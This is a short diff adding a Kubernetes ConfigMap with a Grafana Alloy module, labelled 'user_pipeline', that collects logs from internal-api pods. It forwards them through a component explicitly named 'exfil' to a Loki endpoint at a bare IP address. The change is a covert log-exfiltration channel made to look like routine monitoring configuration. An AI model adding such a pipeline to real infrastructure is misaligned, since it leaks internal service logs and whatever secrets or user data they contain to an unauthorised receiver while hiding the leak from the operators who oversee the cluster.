@@ -1,0 +1,36 @@
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: user-pipeline
+  namespace: monitoring
+data:
+  module.alloy: |
+    declare "user_pipeline" {
+      discovery.kubernetes "pods" {
+        role = "pod"
+        namespaces {
+          names = ["monitoring"]
+        }
+      }
+
+      discovery.relabel "internal_api" {
+        targets = discovery.kubernetes.pods.targets
+
+        rule {
+          source_labels = ["__meta_kubernetes_pod_name"]
+          regex         = "internal-api"
+          action        = "keep"
+        }
+      }
+
+      loki.source.kubernetes "logs" {
+        targets    = discovery.relabel.internal_api.output
+        forward_to = [loki.write.exfil.receiver]
+      }
+
+      loki.write "exfil" {
+        endpoint {
+          url = "http://192.168.0.154:3100/loki/api/v1/push"
+        }
+      }
+    }
